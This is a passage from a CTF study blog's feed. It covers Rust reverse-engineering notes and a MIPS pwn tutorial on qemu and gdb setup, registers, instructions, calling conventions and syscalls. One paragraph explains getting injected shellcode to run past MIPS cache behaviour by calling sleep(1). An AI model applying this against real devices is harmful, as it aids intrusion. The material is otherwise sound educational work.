class="hljs-type">i32</span>; <span class="hljs-number">5</span>] = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>];<br><br>    <span class="hljs-comment">// All elements can be initialized to the same value</span><br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">ys</span>: [<span class="hljs-type">i32</span>; <span class="hljs-number">500</span>] = [<span class="hljs-number">0</span>; <span class="hljs-number">500</span>];<br><br>    <span class="hljs-comment">// Indexing starts at 0</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;first element of the array: &#123;&#125;&quot;</span>, xs[<span class="hljs-number">0</span>]);<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;second element of the array: &#123;&#125;&quot;</span>, xs[<span class="hljs-number">1</span>]);<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;3 nums:&#123;&#125; &#123;&#125; &#123;&#125;&quot;</span>, xs[<span class="hljs-number">0</span>], xs[<span class="hljs-number">1</span>], xs[<span class="hljs-number">2</span>]);<br><br>    <span class="hljs-comment">// `len` returns the count of elements in the array</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;number of elements in array: &#123;&#125;&quot;</span>, xs.<span class="hljs-title function_ invoke__">len</span>());<br><br>    <span class="hljs-comment">// Arrays are stack allocated</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;array occupies &#123;&#125; bytes&quot;</span>, mem::<span class="hljs-title function_ invoke__">size_of_val</span>(&amp;xs));<br><br>    <span class="hljs-comment">// Arrays can be automatically borrowed as slices</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;borrow the whole array as a slice&quot;</span>);<br>    <span class="hljs-title function_ invoke__">analyze_slice</span>(&amp;xs);<br><br>    <span class="hljs-comment">// Slices can point to a section of an array</span><br>    <span class="hljs-comment">// They are of the form [starting_index..ending_index]</span><br>    <span class="hljs-comment">// starting_index is the first position in the slice</span><br>    <span class="hljs-comment">// ending_index is one more than the last position in the slice</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;borrow a section of the array as a slice&quot;</span>);<br>    <span class="hljs-title function_ invoke__">analyze_slice</span>(&amp;ys[<span class="hljs-number">1</span> .. <span class="hljs-number">4</span>]);<br><br>    <span class="hljs-comment">// Out of bound indexing causes compile error</span><br>    <span class="hljs-comment">// println!(&quot;&#123;&#125;&quot;, xs[5]);</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h2><p><img src="/assets/Pasted%20image%2020250217000256.png"></p><h2 id="语法特性"><a href="#语法特性" class="headerlink" title="语法特性"></a>语法特性</h2><h3 id="所有权和声明周期"><a href="#所有权和声明周期" class="headerlink" title="所有权和声明周期"></a>所有权和声明周期</h3><h3 id="静态和动态分配"><a href="#静态和动态分配" class="headerlink" title="静态和动态分配"></a>静态和动态分配</h3><h3 id="泛型和编译时优化"><a href="#泛型和编译时优化" class="headerlink" title="泛型和编译时优化"></a>泛型和编译时优化</h3><h2 id="符号还原"><a href="#符号还原" class="headerlink" title="符号还原"></a>符号还原</h2><blockquote><p>Rust 符号恢复工具：<a href="https://github.com/h311d1n3r/Cerberus" title="GitHub - h311d1n3r&#x2F;Cerberus: A Python tool to unst...">GitHub - h311d1n3r&#x2F;Cerberus: A Python tool to unst…</a> </p></blockquote><ul><li>使用</li></ul><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>Rust 逆向流程：</p><ul><li>字符串信息搜集<ul><li>搜索<code>.rs</code>看用了哪些库，也没有密码库<ul><li>找库子源码、例子&#x2F;对照逆向</li></ul></li><li>搜索标准输出、flag等关键字<ul><li>找调试位置、调试观察数据变化，猜</li></ul></li></ul></li></ul><blockquote><p>2024 Moectf</p></blockquote><blockquote><p>2024YLCTF [Round 2] keygen_rust</p></blockquote><blockquote><p>[AFCTF 2021]rustcheckin</p></blockquote><p>字符串搜集</p><ul><li>搜索<code>.rs</code>看用了哪些库，有没有密码库</li><li>搜索标准输出，flag等关键字</li><li>找库子源码、例子，对照逆向</li><li>找调试位置、调试、观察数据变化</li></ul><blockquote><p>2024 YCB sedRust_happyVm</p></blockquote><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><blockquote><p>参考：<a href="https://www.youtube.com/watch?v=rDoqT-a6UFg">Visualizing memory layout of Rust’s data types [See description&#x2F;first comment]</a><br>参考：CTF 从 0 到 1<br><a href="https://research.qianxin.com/archives/2342">Rust逆向入门：从反编译视角学习内存模型 – 奇安信技术研究院</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 高级语言逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MIPS Pwn</title>
      <link href="/2025/07/01/ctf/heter/mips/"/>
      <url>/2025/07/01/ctf/heter/mips/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="编译环境"><a href="#编译环境" class="headerlink" title="编译环境"></a>编译环境</h3><ul><li>安装交叉编译工具</li></ul><p>安装 MIPS 架构交叉编译工具。</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">sudo apt update<br>sudo apt <span class="hljs-keyword">install </span>gcc-mips-linux-gnu <span class="hljs-keyword">binutils-mips-linux-gnu</span><br><span class="hljs-keyword"></span>sudo apt <span class="hljs-keyword">install </span>gcc-mipsel-linux-gnu <span class="hljs-keyword">binutils-mipsel-linux-gnu</span><br><span class="hljs-keyword"></span>apt-get <span class="hljs-keyword">install </span>gcc-mips-linux-gnu          <span class="hljs-comment">#安装用于编译大端序的MIPS架构的GCC</span><br>apt-get <span class="hljs-keyword">install </span>gcc-mipsel-linux-gnu        <span class="hljs-comment">#安装用于编译小端序的MIPS架构的GCC</span><br>apt-get <span class="hljs-keyword">install </span>gcc-mips64-linux-gnuabi64   <span class="hljs-comment">#安装用于编译大端序的MIPS64位架构的GCC</span><br>apt-get <span class="hljs-keyword">install </span>gcc-mips64el-linux-gnuabi64 <span class="hljs-comment">#安装用于编译大端序的MIPS64位架构的GCC</span><br></code></pre></td></tr></table></figure><ul><li>编译流程</li></ul><p>将 MIPS 汇编文件编译为可执行文件。这里我们先要确定需要编译端序的文件架构，然后选择相应的编译工具。</p><p>这里我们以 MIPS 32 位架构小端序为例。</p><ol><li>将汇编文件编译为目标文件</li></ol><p>因为我们需要将汇编文件编译为 MIPS 架构小端序的可执行文件，所以这里选择<code>mipsel</code>即<code>mips</code>架构小端序编译工具，默认为 32 位。</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">mipsel-linux-gnu-as <span class="hljs-built_in">demo</span>.s -o <span class="hljs-built_in">demo</span>.o<br></code></pre></td></tr></table></figure><ol><li>链接目标文件</li></ol><p>将目标文件链接为可执行程序，同样选择相应架构的链接器进行链接。</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">mipsel-linux-gnu-ld <span class="hljs-built_in">demo</span>.o -o <span class="hljs-built_in">demo</span><br></code></pre></td></tr></table></figure><ul><li>安装动态链接库</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">apt search &quot;libc6-&quot; | grep &quot;mips&quot;<br></code></pre></td></tr></table></figure><h3 id="运行和调试环境"><a href="#运行和调试环境" class="headerlink" title="运行和调试环境"></a>运行和调试环境</h3><ul><li>安装 qemu</li></ul><p>我们通过 qemu 来模拟运行</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">sudo apt <span class="hljs-keyword">update</span><br>sudo apt<span class="hljs-operator">-</span><span class="hljs-keyword">get</span> install qemu qemu<span class="hljs-operator">-</span><span class="hljs-keyword">system</span><span class="hljs-operator">-</span>mips qemu<span class="hljs-operator">-</span><span class="hljs-keyword">user</span> qemu<span class="hljs-operator">-</span><span class="hljs-keyword">user</span><span class="hljs-operator">-</span><span class="hljs-keyword">static</span><br></code></pre></td></tr></table></figure><ul><li>远行流程</li></ul><p>根据可执行文件架构，选择对应的 qemu 来运行。</p><p>例如 MIPS 32位小端序架构，我们可以选择 <code>qemu-mipsel</code> 来运行</p><p>这里还要区分链接方式，如果动态链接则需要指定动态链接库。</p><p><strong>静态链接：</strong></p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">qemu-mipsel-<span class="hljs-keyword">static</span> ./demo<br></code></pre></td></tr></table></figure><p><strong>动态链接：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">qemu-mipsel -L /usr/mipsel-linux-gnu ./demo<br></code></pre></td></tr></table></figure><ul><li>调试流程</li></ul><p>安装<code>gdb-multiarch</code>来调试异架构程序</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt install  gdb-multiarch<br></code></pre></td></tr></table></figure><p>首先我们通过 qemu 以调试模式运行程序，<code>-g</code>参数表示设置为调试模式，<code>1234</code>表示程序映射的端口。</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">qemu-mipsel-<span class="hljs-keyword">static</span> -g <span class="hljs-number">1234</span> ./demo<br></code></pre></td></tr></table></figure><p>然后运行<code>gdb-multiarch</code>，并根据架构和端序设置参数。</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gams">gdb-multiarch<br><span class="hljs-keyword">set</span> architecture <span class="hljs-comment">mips</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">endian little</span><br></code></pre></td></tr></table></figure><p>然后连接映射程序的端口</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">target</span> remote localhost:<span class="hljs-number">1234</span><br></code></pre></td></tr></table></figure><h2 id="运行与调试"><a href="#运行与调试" class="headerlink" title="运行与调试"></a>运行与调试</h2><p>运行动态链接程序，需要通过<code>-L</code>参数指定动态链接库位置。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">qemu-mipsel -L /usr/mipsel-linux-gnu/ ./pwn<br></code></pre></td></tr></table></figure><p>运行静态链接程序，直接使用 qemu 运行即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">qemu-mipsel ./pwn<br></code></pre></td></tr></table></figure><p>gcc 交叉编译 mips 程序。</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">mipsel-linux-gnu-gcc vuln.<span class="hljs-keyword">c</span> -o vuln<br></code></pre></td></tr></table></figure><ul><li>调试</li></ul><p>通过 qemu 运行程序映射到端口，然后通过 gdb 连接调试。</p><p>qemu 将一个 mips 程序运行并映射到 1234 端口</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">qemu-mipsel -L /usr/mipsel-linux-gnu/ -g 1234 ./pwn<br>gdb-multiarch ./pwn -q<br>set architecture mips<br>target remote localhost:1234<br></code></pre></td></tr></table></figure><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-keyword">show</span> architecture<br></code></pre></td></tr></table></figure><h2 id="MIPS-架构知识"><a href="#MIPS-架构知识" class="headerlink" title="MIPS 架构知识"></a>MIPS 架构知识</h2><ul><li><p>MIPS 固定 <code>4</code> 字节指令长度</p></li><li><p>栈是从内存的高地址向低地址方向增长的</p></li><li><p>叶子函数：函数内部没有再调用其他函数</p></li><li><p>非叶子函数：函数内部调用其他函数的函数</p></li><li><p>流水线效应：在分析 MIPS 汇编代码时会发现，其跳转到函数或者分支跳转语句的下一条都是 <code>nop</code> （），这是因为 MIPS 采用了高度的流水线，其中最重要的是跳转指令导致的<strong>分支延迟效应</strong>。在分支跳转语句后面那条语句叫做<strong>分支延迟槽</strong>，当跳转语句刚执行的一瞬间，跳转到的地址刚填充好（填充到程序计数器），<strong>还没有执行程序计数器中存放的指令，分支延迟槽的指令已经被执行了，这就是流水线效应</strong>（几条指令被同时执行，只是处于不同的阶段， <strong>MIPS 不像其他架构那样存在流水线阻塞</strong>），为了避免出现问题，因此在分支跳转语句的下一条指令通常是 <code>nop</code> 指令或者其他有用的指令。</p></li><li><p>缓存刷新机制：<code>MIPS CPUs</code>有两个独立的 <code>cache</code> : <code>指令cache</code> 和 <code>数据cache</code> 。 指令和数据分别在两个不同的缓存中。当缓存满了，会触发 <code>flush</code> , 将数据写回到主内存。攻击者的攻击<code>payload</code> 通常会被应用当做数据来处理，存储在数据缓存中。当 <code>payload</code> 触发漏洞， 劫持程序执行流程的时候，会去执行内存中的 <code>shellcode</code> .如果数据缓存没有触发 <code>flush</code> 的话，<code>shellcode</code> 依然存储在缓存中，而没有写入主内存。这会导致程序执行了本该存储 <code>shellcode</code> 的地址处随机的代码，导致不可预知的后果。(通常执行 <code>sleep(1)</code> 刷新)</p></li><li><p>只有特定的指令（如 <code>lw</code> 和 <code>sw</code>）可以访问内存，所有其他操作都在寄存器之间完成。这种设计简化了指令和流水线操作。</p></li></ul><h2 id="汇编基础"><a href="#汇编基础" class="headerlink" title="汇编基础"></a>汇编基础</h2><h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><p>MIPS 有 32 个通用寄存器，其中每个寄存器都是 32 位，用于存储操作数、中间结果、返回地址等。</p><table><thead><tr><th>寄存器编号</th><th>寄存器名称</th><th>寄存器描述</th></tr></thead><tbody><tr><td>0</td><td><code>zero</code></td><td>永远为零</td></tr><tr><td>1</td><td><code>$at</code></td><td>保留寄存器</td></tr><tr><td>2~3</td><td><code>$v0~$v1</code></td><td>函数返回值</td></tr><tr><td>4~7</td><td><code>a0-a3</code></td><td>函数参数寄存器，不够用堆栈处理</td></tr><tr><td>8~15</td><td><code>t0-t7</code></td><td>临时寄存器</td></tr><tr><td>16~23</td><td><code>$s0~$s7</code></td><td>保存寄存器，用于保存函数调用中的参数和返回值</td></tr><tr><td>24~25</td><td><code>$t8~$t9</code></td><td>临时寄存器</td></tr><tr><td>26~27</td><td><code>$k0~$k1</code></td><td>保留寄存器</td></tr><tr><td>28</td><td><code>$gp</code></td><td>全局指针</td></tr><tr><td>29</td><td><code>$sp</code></td><td>堆栈指针</td></tr><tr><td>30</td><td><code>$fp</code></td><td>保存栈指针</td></tr><tr><td>31</td><td><code>$ra</code></td><td>返回地址</td></tr></tbody></table><p>MIPS 架构中还定义了 3 个特殊的寄存器，分别是<code>PC</code>（程序计数器）、<code>HI</code>（乘除结果高位寄存器）、<code>LO</code>（乘除结果低位寄存器）。</p><h3 id="指令格式"><a href="#指令格式" class="headerlink" title="指令格式"></a>指令格式</h3><p>MIPS 的指令集采用 3 种主要格式：</p><ol><li><p>R 型指令（Register）</p><ul><li>这种指令格式用于寄存器之间的操作。</li><li>格式：<code>opcode | rs | rt | rd | shamt | funct</code><ul><li>opcode：操作码，指令该指令的操作类型。</li><li>rs,rt：源寄存器。</li><li>rd：目标寄存器。</li><li>shamt：移位操作的位数。</li><li>funct：指定具体操作的附加操作码。</li></ul></li></ul></li><li><p>I 型指令（Immediate）</p><ul><li>这种指令用于处理立即数（常量）和寄存器的操作。</li><li>格式：<code>opcode | rs | rt | immediate</code><ul><li><code>opcode</code>：操作码，指定该指令的操作类型。</li><li><code>rs</code>：源寄存器。</li><li><code>rt</code>：目标寄存器。</li><li><code>immediate</code>：立即数，用于与寄存器中的值进行运算。</li></ul></li></ul></li><li><p>J 型指令（Jump）</p><ul><li>这种指令用于跳转到其他地址。</li><li>格式：<code>opcode | address</code><ul><li><code>opcode</code>：操作码。</li><li><code>address</code>：跳转目标地址。</li></ul></li></ul></li></ol><h3 id="寻址方式"><a href="#寻址方式" class="headerlink" title="寻址方式"></a>寻址方式</h3><ol start="4"><li>立即数寻址：操作数是位于指令自身中的常数。</li></ol><p>将 <code>$t1</code> 中的值加上常数 10，并存储在 <code>$t0</code> 中</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">addi </span>$<span class="hljs-built_in">t0</span>, $<span class="hljs-built_in">t1</span>, <span class="hljs-number">10</span><br></code></pre></td></tr></table></figure><ol start="5"><li>寄存器寻址：操作数是寄存器。</li></ol><p>将 <code>$t1</code> 和 <code>$t2</code> 的值相加，结果存储在 <code>$t0</code> 中</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">add</span> <span class="hljs-variable">$t0</span>, <span class="hljs-variable">$t1</span>, <span class="hljs-variable">$t2</span><br></code></pre></td></tr></table></figure><ol start="6"><li>基址寻址或偏移寻址：操作数在内存中，其地址是指令中基址寄存器和常数的和，如lw与sw指令。</li></ol><p>从 <code>$t1</code> 中的基址加上偏移量 4 的内存地址处加载数据到 <code>$t0</code> 中，然后将 <code>$t0</code> 的值存储到 <code>$sp</code> 基址减去 8 的内存地址中。</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">lw </span>$<span class="hljs-built_in">t0</span>, <span class="hljs-number">4</span>($<span class="hljs-built_in">t1</span>)<br><span class="hljs-keyword">sw </span>$<span class="hljs-built_in">t0</span>, -<span class="hljs-number">8</span>($<span class="hljs-built_in">sp</span>)<br></code></pre></td></tr></table></figure><ol start="7"><li><code>PC</code>相对寻址：地址是<code>PC</code>和指令中常数的和。</li></ol><p>如果 <code>$t0</code> 和 <code>$t1</code> 相等，则跳转到偏移地址处执行</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">beq </span>$<span class="hljs-built_in">t0</span>, $<span class="hljs-built_in">t1</span>, offset<br></code></pre></td></tr></table></figure><ol start="8"><li>伪直接寻址：跳转地址由指令中26字段和PC高位相连而成。</li></ol><p>跳转到目标地址，由 <code>PC</code> 高位与指令中的 26 位目标字段拼接而成</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs aspectj">j <span class="hljs-keyword">target</span><br></code></pre></td></tr></table></figure><h3 id="常用指令"><a href="#常用指令" class="headerlink" title="常用指令"></a>常用指令</h3><table><thead><tr><th>类型</th><th>指令</th><th>功能描述</th><th>示例</th><th></th></tr></thead><tbody><tr><td><strong>R 型</strong></td><td><code>add</code></td><td>加法，$rd &#x3D; $rs + $rt</td><td><code>add $t0, $t1, $t2</code></td><td></td></tr><tr><td><strong>R 型</strong></td><td><code>sub</code></td><td>减法，$rd &#x3D; $rs - $rt</td><td><code>sub $t0, $t1, $t2</code></td><td></td></tr><tr><td><strong>R 型</strong></td><td><code>and</code></td><td>按位与，$rd &#x3D; $rs &amp; $rt</td><td><code>and $t0, $t1, $t2</code></td><td></td></tr><tr><td><strong>R 型</strong></td><td><code>or</code></td><td>按位或，$rd &#x3D; $rs</td><td>$rt</td><td><code>or $t0, $t1, $t2</code></td></tr><tr><td><strong>R 型</strong></td><td><code>xor</code></td><td>按位异或，$rd &#x3D; $rs ^ $rt</td><td><code>xor $t0, $t1, $t2</code></td><td></td></tr><tr><td><strong>R 型</strong></td><td><code>nor</code></td><td>按位取反或，$rd &#x3D; ~($rs</td><td>$rt)</td><td><code>nor $t0, $t1, $t2</code></td></tr><tr><td><strong>R 型</strong></td><td><code>sll</code></td><td>逻辑左移，$rd &#x3D; $rt &lt;&lt; sa</td><td><code>sll $t0, $t1, 2</code></td><td></td></tr><tr><td><strong>R 型</strong></td><td><code>srl</code></td><td>逻辑右移，$rd &#x3D; $rt &gt;&gt; sa</td><td><code>srl $t0, $t1, 2</code></td><td></td></tr><tr><td><strong>R 型</strong></td><td><code>sra</code></td><td>算术右移，$rd &#x3D; $rt &gt;&gt; sa</td><td><code>sra $t0, $t1, 2</code></td><td></td></tr><tr><td><strong>R 型</strong></td><td><code>slt</code></td><td>小于，$rd &#x3D; ($rs &lt; $rt) ? 1 : 0</td><td><code>slt $t0, $t1, $t2</code></td><td></td></tr><tr><td><strong>R 型</strong></td><td><code>sltu</code></td><td>无符号小于，$rd &#x3D; ($rs &lt; $rt unsigned) ? 1 : 0</td><td><code>sltu $t0, $t1, $t2</code></td><td></td></tr><tr><td><strong>I 型</strong></td><td><code>addi</code></td><td>加法立即数，$rt &#x3D; $rs + imm</td><td><code>addi $t0, $t1, 10</code></td><td></td></tr><tr><td><strong>I 型</strong></td><td><code>addiu</code></td><td>无符号加法立即数，$rt &#x3D; $rs + imm</td><td><code>addiu $t0, $t1, 10</code></td><td></td></tr><tr><td><strong>I 型</strong></td><td><code>andi</code></td><td>按位与立即数，$rt &#x3D; $rs &amp; imm</td><td><code>andi $t0, $t1, 0xFF</code></td><td></td></tr><tr><td><strong>I 型</strong></td><td><code>ori</code></td><td>按位或立即数，$rt &#x3D; $rs</td><td>imm</td><td><code>ori $t0, $t1, 0xFF</code></td></tr><tr><td><strong>I 型</strong></td><td><code>xori</code></td><td>按位异或立即数，$rt &#x3D; $rs ^ imm</td><td><code>xori $t0, $t1, 0xFF</code></td><td></td></tr><tr><td><strong>I 型</strong></td><td><code>slti</code></td><td>小于立即数，$rt &#x3D; ($rs &lt; imm) ? 1 : 0</td><td><code>slti $t0, $t1, 10</code></td><td></td></tr><tr><td><strong>I 型</strong></td><td><code>sltiu</code></td><td>无符号小于立即数，$rt &#x3D; ($rs &lt; imm unsigned) ? 1 : 0</td><td><code>sltiu $t0, $t1, 10</code></td><td></td></tr><tr><td><strong>I 型</strong></td><td><code>lui</code></td><td>加载上半字，$rt &#x3D; imm &lt;&lt; 16</td><td><code>lui $t0, 0x1000</code></td><td></td></tr><tr><td><strong>I 型</strong></td><td><code>lw</code></td><td>从内存加载字（32位）到寄存器 $rt</td><td><code>lw $t0, 0($t1)</code></td><td></td></tr><tr><td><strong>I 型</strong></td><td><code>sw</code></td><td>将寄存器 $rt 的值存储到内存中的地址 $t1 + offset</td><td><code>sw $t0, 0($t1)</code></td><td></td></tr><tr><td><strong>I 型</strong></td><td><code>lb</code></td><td>从内存加载字节（8位）到寄存器 $rt</td><td><code>lb $t0, 0($t1)</code></td><td></td></tr><tr><td><strong>I 型</strong></td><td><code>lbu</code></td><td>从内存加载无符号字节（8位）到寄存器 $rt</td><td><code>lbu $t0, 0($t1)</code></td><td></td></tr><tr><td><strong>I 型</strong></td><td><code>sb</code></td><td>将寄存器 $rt 的低8位存储到内存中的地址 $t1 + offset</td><td><code>sb $t0, 0($t1)</code></td><td></td></tr><tr><td><strong>I 型</strong></td><td><code>lh</code></td><td>从内存加载半字（16位）到寄存器 $rt</td><td><code>lh $t0, 0($t1)</code></td><td></td></tr><tr><td><strong>I 型</strong></td><td><code>lhu</code></td><td>从内存加载无符号半字（16位）到寄存器 $rt</td><td><code>lhu $t0, 0($t1)</code></td><td></td></tr><tr><td><strong>I 型</strong></td><td><code>sh</code></td><td>将寄存器 $rt 的低16位存储到内存中的地址 $t1 + offset</td><td><code>sh $t0, 0($t1)</code></td><td></td></tr><tr><td><strong>I 型</strong></td><td><code>lwc1</code></td><td>从内存加载单精度浮点数到浮点寄存器 $f0</td><td><code>lwc1 $f0, 0($t1)</code></td><td></td></tr><tr><td><strong>I 型</strong></td><td><code>swc1</code></td><td>将浮点寄存器 $f0 中的单精度浮点数存储到内存中的地址 $t1 + offset</td><td><code>swc1 $f0, 0($t1)</code></td><td></td></tr><tr><td><strong>I 型</strong></td><td><code>ld</code></td><td>从内存加载双字（64位）到寄存器 $rt</td><td><code>ld $t0, 0($t1)</code></td><td></td></tr><tr><td><strong>I 型</strong></td><td><code>sd</code></td><td>将寄存器 $rt 的64位值存储到内存中的地址 $t1 + offset</td><td><code>sd $t0, 0($t1)</code></td><td></td></tr><tr><td><strong>J 型</strong></td><td><code>j</code></td><td>无条件跳转，跳转到目标地址</td><td><code>j target</code></td><td></td></tr><tr><td><strong>J 型</strong></td><td><code>jal</code></td><td>跳转并链接，将返回地址存储到 $ra</td><td><code>jal target</code></td><td></td></tr><tr><td><strong>J 型</strong></td><td><code>jr</code></td><td>跳转到寄存器指定的地址</td><td><code>jr $ra</code></td><td></td></tr><tr><td><strong>J 型</strong></td><td><code>jalr</code></td><td>跳转并链接到寄存器指定的地址，返回地址存储在 $ra</td><td><code>jalr $t0</code></td><td></td></tr><tr><td><strong>特殊</strong></td><td><code>syscall</code></td><td>系统调用，执行指定的操作</td><td><code>syscall</code></td><td></td></tr><tr><td><strong>特殊</strong></td><td><code>break</code></td><td>生成断点，通常用于调试</td><td><code>break</code></td><td></td></tr><tr><td><strong>特殊</strong></td><td><code>eret</code></td><td>从异常中返回到用户态</td><td><code>eret</code></td><td></td></tr><tr><td><strong>特殊</strong></td><td><code>nop</code></td><td>无操作，通常用于填充</td><td><code>nop</code></td><td></td></tr></tbody></table><h2 id="函数调用约定"><a href="#函数调用约定" class="headerlink" title="函数调用约定"></a>函数调用约定</h2><p>如果函数的参数小于等于四个，那么会使用 <code>$a0-$a3</code> 寄存器来存放参数。</p><p>如果参数多于四个，那么多出来的参数会使用栈进行传参。</p><p>函数 <code>A</code> 调用函数 <code>B</code>。若 <code>B</code> 是叶子函数（即 <code>B</code> 不调用其他函数），调用 <code>B</code> 时会将返回地址直接存入 <code>$ra</code> 寄存器；若 <code>B</code> 是非叶子函数（即 <code>B</code> 调用了函数 <code>C</code>），则在跳转到 <code>B</code> 时，返回地址会先存入 <code>$ra</code>，然后在 <code>B</code> 内部将 <code>$ra</code> 的值保存到栈中。</p><p>当 <code>B</code> 调用 <code>C</code> 时，<code>C</code> 的返回地址会覆盖 <code>$ra</code> 的值；返回时，<code>jr $ra</code> 指令会跳回 <code>B</code> 的调用点。待 <code>B</code> 执行完毕准备返回 <code>A</code> 时，它会从栈中恢复原始的返回地址到 <code>$ra</code>，再通过 <code>jr $ra</code> 跳回 <code>A</code>。</p><h2 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h2><p>在 x86 的 Linux 系统中，功能函数是由系统调用来实现的。我们可以直接使用功能函数，也可以使用系统调用来使用相应功能。同样，在 MIPS 架构中，系统调用机制也类似，通过 <code>syscall</code> 指令触发。MIPS 的系统调用实现方式不同于 x86，但基本原理相同：通过触发中断与内核进行交互。</p><ul><li>系统调用号：在 MIPS 中 <code>$v0</code> 寄存器用于存放系统调用号。</li><li>参数：系统调用的参数通常存储在 <code>$a0</code> 到 <code>$a3</code> 寄存器中，最多可以有 4 个参数。</li><li>返回值：系统调用的返回值通常存储在 <code>$v0</code> 和 <code>v1</code> 寄存器中。</li></ul><blockquote><p>注：在 MIPS 架构下，系统调用号可能因操作系统而异。</p></blockquote><p>以下是基于 Linux MIPS ABI 的一些常用系统调用及其功能：</p><table><thead><tr><th><strong>系统调用号</strong></th><th><strong>名称</strong></th><th><strong>功能说明</strong></th></tr></thead><tbody><tr><td>4001</td><td><code>exit</code></td><td>退出程序，参数是退出状态码</td></tr><tr><td>4003</td><td><code>read</code></td><td>从文件描述符读取数据</td></tr><tr><td>4004</td><td><code>write</code></td><td>向文件描述符写入数据</td></tr><tr><td>4005</td><td><code>open</code></td><td>打开文件</td></tr><tr><td>4006</td><td><code>close</code></td><td>关闭文件描述符</td></tr><tr><td>4009</td><td><code>link</code></td><td>创建硬链接</td></tr><tr><td>4010</td><td><code>unlink</code></td><td>删除文件</td></tr><tr><td>4011</td><td><code>execve</code></td><td>执行新程序</td></tr><tr><td>4012</td><td><code>chdir</code></td><td>改变当前工作目录</td></tr><tr><td>4013</td><td><code>time</code></td><td>获取当前时间</td></tr><tr><td>4014</td><td><code>mknod</code></td><td>创建特殊文件</td></tr><tr><td>4015</td><td><code>chmod</code></td><td>修改文件权限</td></tr><tr><td>4016</td><td><code>lseek</code></td><td>文件指针定位</td></tr><tr><td>4017</td><td><code>getpid</code></td><td>获取当前进程 ID</td></tr><tr><td>4020</td><td><code>getuid</code></td><td>获取用户 ID</td></tr><tr><td>4021</td><td><code>geteuid</code></td><td>获取有效用户 ID</td></tr><tr><td>4022</td><td><code>getgid</code></td><td>获取组 ID</td></tr><tr><td>4023</td><td><code>getegid</code></td><td>获取有效组 